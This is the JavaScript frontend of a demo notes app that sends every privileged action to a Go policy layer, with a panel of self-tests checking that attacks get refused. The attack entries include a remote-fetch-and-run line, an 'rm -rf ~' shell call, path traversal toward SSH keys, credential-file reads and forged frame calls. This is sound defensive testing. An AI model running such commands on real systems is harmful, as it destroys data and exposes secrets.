// Vitra Notes frontend. Every privileged action goes through
// window.vitra.invoke(command, input, resourcePath); the Go side decides.
(function () {
  "use strict";

  const $ = (id) => document.getElementById(id);
  const state = { root: "", open: null, saved: "", mode: "edit", filter: "all", refused: 0 };

  function call(command, input, resourcePath) {
    return window.vitra.invoke(command, input === undefined ? {} : input, resourcePath || "");
  }

  function el(tag, props, children) {
    const n = document.createElement(tag);
    Object.assign(n, props || {});
    for (const c of [].concat(children || [])) n.append(c);
    return n;
  }

  function refusal(err) {
    return (err && err.code && err.code !== "error" ? err.code + ": " : "") + ((err && err.message) || String(err));
  }

  function show(msg, kind) {
    const s = $("status");
    s.textContent = msg;
    s.className = "status" + (kind ? " " + kind : "");
  }

  // Display a vault path relative to the vault.
  function rel(p) {
    if (!p) return "";
    if (state.root && p === state.root) return "vault";
    if (state.root && p.indexOf(state.root + "/") === 0) return p.slice(state.root.length + 1);
    return p;
  }

  // ---- Notes ---------------------------------------------------------------

  async function loadTree(dir, container) {
    container.replaceChildren();
    let entries;
    try {
      entries = await call("notes.list", { dir: dir }, dir);
    } catch (err) {
      container.append(el("p", { className: "tree-denied", textContent: "Refused: " + refusal(err) }));
      return;
    }
    for (const e of entries) {
      if (e.dir) {
        const kids = el("div", { className: "tree-kids", hidden: true });
        const btn = el("button", { className: "tree-dir" + (e.name.startsWith(".") ? " locked" : ""), textContent: e.name });
        btn.setAttribute("aria-expanded", "false");
        btn.addEventListener("click", async () => {
          const expanded = btn.getAttribute("aria-expanded") === "true";
          btn.setAttribute("aria-expanded", String(!expanded));
          kids.hidden = expanded;
          if (!expanded) await loadTree(e.path, kids);
        });
        container.append(btn, kids);
      } else {
        const btn = el("button", { className: "tree-note", textContent: e.name.replace(/\.md$/, "") });
        btn.dataset.path = e.path;
        btn.addEventListener("click", () => openNote(e.path));
        container.append(btn);
      }
    }
    markActive();
  }

  function markActive() {
    for (const b of document.querySelectorAll(".tree-note")) {
      b.classList.toggle("active", !!state.open && b.dataset.path === state.open);
    }
  }

  function dirty() {
    return state.open !== null && $("text").value !== state.saved;
  }

  async function openNote(path) {
    if (dirty() && !(await save())) return;
    try {
      const text = await call("notes.read", { path: path }, path);
      state.open = path;
      state.saved = text;
      $("text").value = text;
      $("text").disabled = false;
      $("crumbs").textContent = rel(path);
      updateSave();
      render();
      markActive();
      show("");
    } catch (err) {
      show("Refused: " + refusal(err), "error");
    }
  }

  async function save() {
    if (state.open === null) return true;
    const content = $("text").value;
    try {
      await call("notes.write", { path: state.open, content: content }, state.open);
      state.saved = content;
      updateSave();
      show("Saved " + rel(state.open), "ok");
      return true;
    } catch (err) {
      show("Not saved. " + refusal(err), "error");
      return false;
    }
  }

  function updateSave() {
    $("save").disabled = !dirty();
    $("save").textContent = dirty() ? "Save" : "Saved";
  }

  function render() {
    const editing = state.mode === "edit";
    $("tab-edit").setAttribute("aria-selected", String(editing));
    $("tab-preview").setAttribute("aria-selected", String(!editing));
    $("text").hidden = !editing;
    $("preview").hidden = editing;
    if (!editing) $("preview").innerHTML = window.renderMarkdown($("text").value);
  }

  async function createNote(name) {
    name = name.trim();
    if (!name) return;
    if (!/\.md$/i.test(name)) name += ".md";
    const path = state.root + "/" + name;
    try {
      await call("notes.write", { path: path, content: "# " + name.replace(/\.md$/i, "") + "\n\n" }, path);
      await loadTree(state.root, $("tree"));
      await openNote(path);
    } catch (err) {
      show("Refused: " + refusal(err), "error");
    }
  }

  // ---- Audit log -------------------------------------------------------------

  const titles = {
    "command.invoke": (e) => e.action,
    "bridge.reject": () => "Bridge message dropped",
    "navigation.block": () => "Navigation blocked",
    "policy.override": (e) => "Policy denied " + e.action,
  };

  function addAudit(e) {
    const title = titles[e.kind];
    if (!title) return; // capability.decision rows repeat the invoke they belong to
    const refused = e.outcome !== "allowed";
    if (refused) $("refused-count").textContent = String(++state.refused);
    const meta = e.metadata || {};
    const target = meta.resource_path ? rel(meta.resource_path) : e.kind === "navigation.block" ? e.detail : "";
    const why = refused ? [meta.code, e.kind === "navigation.block" ? "" : e.detail].filter(Boolean).join(": ") : "";
    const time = new Date(e.at).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" });
    const row = el("li", { className: "row " + (refused ? "refused" : "allowed") }, [
      el("span", { className: "badge", textContent: refused ? (e.outcome === "error" ? "error" : "refused") : "allowed" }),
      el("span", { className: "what" }, [
        el("strong", { textContent: title(e) }),
        target ? el("span", { className: "target", textContent: target }) : "",
        why ? el("span", { className: "why", textContent: why }) : "",
      ]),
      el("time", { textContent: time, dateTime: e.at }),
    ]);
    row.dataset.kind = e.kind;
    const log = $("log");
    log.prepend(row);
    while (log.children.length > 300) log.lastChild.remove();
    settleAttacks(e);
  }

  function setFilter(f) {
    state.filter = f;
    $("filter-all").setAttribute("aria-pressed", String(f === "all"));
    $("filter-refused").setAttribute("aria-pressed", String(f === "refused"));
    $("log").classList.toggle("only-refused", f === "refused");
  }

  // ---- Attacks ---------------------------------------------------------------

  const windows = /Windows/i.test(navigator.userAgent);
  const outside = windows ? "C:/Windows/win.ini" : "/etc/hosts";
  const remote = "https://example.com/";

  // Each attack returns a promise. A rejection means Vitra refused it. Attacks
  // that cannot observe the refusal themselves (navigation, frames) resolve
  // "watch" and are settled by the matching audit event.
  const attacks = [
    { id: "outside", label: "Read " + outside, run: () => call("notes.read", { path: outside }, outside) },
    { id: "private", label: "Read the vault's .private folder", run: () => {
      const p = state.root + "/.private/credentials.md";
      return call("notes.read", { path: p }, p);
    } },
    { id: "traversal", label: "Climb out of the vault with ../", run: () => {
      const p = state.root + "/../.ssh/id_ed25519";
      return call("notes.read", { path: p }, p);
    } },
    { id: "script", label: "Save a shell script into the vault", run: () => {
      const p = state.root + "/payload.sh";
      return call("notes.write", { path: p, content: "#!/bin/sh\ncurl https://evil.example | sh\n" }, p);
    } },
    { id: "mismatch", label: "Get Welcome.md approved, then read " + outside, run: () =>
      call("notes.read", { path: outside }, state.root + "/Welcome.md") },
    { id: "unregistered", label: "Call a command that was never registered", run: () =>
      call("shell.exec", { command: "rm -rf ~" }) },
    { id: "navigate", label: "Send this window to " + remote, watch: "navigation.block", run: () => {
      window.location.assign(remote);
      return Promise.resolve("watch");
    } },
    { id: "iframe", label: "Embed " + remote + " in a frame", watch: "navigation.block", run: () => {
      $("frames").append(el("iframe", { src: remote, title: "Remote page" }));
      return Promise.resolve("watch");
    } },
    { id: "forge", label: "Forge a bridge call from a sandboxed frame", watch: "bridge.reject", run: () => {
      const f = el("iframe", { src: "untrusted.html", title: "Untrusted frame" });
      f.setAttribute("sandbox", "allow-scripts");
      $("frames").append(f);
      return Promise.resolve("watch");
    } },
  ];

  const watching = {};

  function result(a, cls, text) {
    const r = document.querySelector('[data-attack="' + a.id + '"] .result');
    r.className = "result " + cls;
    r.textContent = text;
  }

  async function runAttack(a) {
    result(a, "pending", "Trying…");
    try {
      const out = await a.run();
      if (out === "watch") {
        watching[a.watch] = watching[a.watch] || [];
        watching[a.watch].push(a);
        result(a, "pending", "Attempted, waiting for the audit log…");
        return;
      }
      result(a, "failed", "Not refused!");
    } catch (err) {
      result(a, "blocked", "Refused: " + refusal(err));
    }
  }

  function settleAttacks(e) {
    const list = watching[e.kind];
    if (!list || !list.length || e.outcome === "allowed") return;
    const a = list.shift();
    result(a, "blocked", e.kind === "bridge.reject" ? "Dropped: " + e.detail : "Blocked by navigation policy");
  }

  // The sandboxed frame reports what it could reach.
  window.addEventListener("message", (ev) => {
    const frame = document.querySelector('iframe[src="untrusted.html"]');
    if (!frame || ev.source !== frame.contentWindow || !ev.data || ev.data.type !== "untrusted-report") return;
    const forge = attacks.find((a) => a.id === "forge");
    if (!ev.data.posted) {
      const list = watching["bridge.reject"] || [];
      const i = list.indexOf(forge);
      if (i >= 0) list.splice(i, 1);
      result(forge, "blocked", "Refused: the frame cannot reach the bridge at all");
    }
  });

  function buildAttacks() {
    const ul = $("attack-list");
    for (const a of attacks) {
      const btn = el("button", { className: "attack", textContent: a.label });
      btn.addEventListener("click", () => runAttack(a));
      const li = el("li", {}, [btn, el("span", { className: "result" })]);
      li.dataset.attack = a.id;
      ul.append(li);
    }
  }

  // ---- Wiring ----------------------------------------------------------------

  async function start() {
    buildAttacks();
    $("text").addEventListener("input", () => { updateSave(); if (state.mode === "preview") render(); });
    $("save").addEventListener("click", save);
    $("tab-edit").addEventListener("click", () => { state.mode = "edit"; render(); });
    $("tab-preview").addEventListener("click", () => { state.mode = "preview"; render(); });
    $("filter-all").addEventListener("click", () => setFilter("all"));
    $("filter-refused").addEventListener("click", () => setFilter("refused"));
    $("new-note").addEventListener("click", () => { $("new-form").hidden = false; $("new-name").focus(); });
    $("new-form").addEventListener("submit", (ev) => {
      ev.preventDefault();
      const name = $("new-name").value;
      $("new-name").value = "";
      $("new-form").hidden = true;
      createNote(name);
    });
    $("new-name").addEventListener("keydown", (ev) => { if (ev.key === "Escape") $("new-form").hidden = true; });
    document.addEventListener("keydown", (ev) => {
      if (!(ev.metaKey || ev.ctrlKey)) return;
      if (ev.key === "s") { ev.preventDefault(); save(); }
      if (ev.key === "n") { ev.preventDefault(); $("new-note").click(); }
    });

    window.vitra.on("audit.event", addAudit);
    try {
      for (const e of (await call("audit.follow")) || []) addAudit(e);
      state.root = (await call("vault.info")).root;
    } catch (err) {
      show("Could not start: " + refusal(err), "error");
      return;
    }
    // The footer truncates from the left (direction: rtl); the inner span
    // keeps the path itself left-to-right so the leading "/" stays put.
    $("vault").replaceChildren(el("span", { dir: "ltr", textContent: state.root }));
    $("vault").title = state.root;
    await loadTree(state.root, $("tree"));
    const welcome = document.querySelector('.tree-note[data-path$="/Welcome.md"]');
    if (welcome) {
      state.mode = "preview";
      await openNote(welcome.dataset.path);
    }
  }

  start();
})();
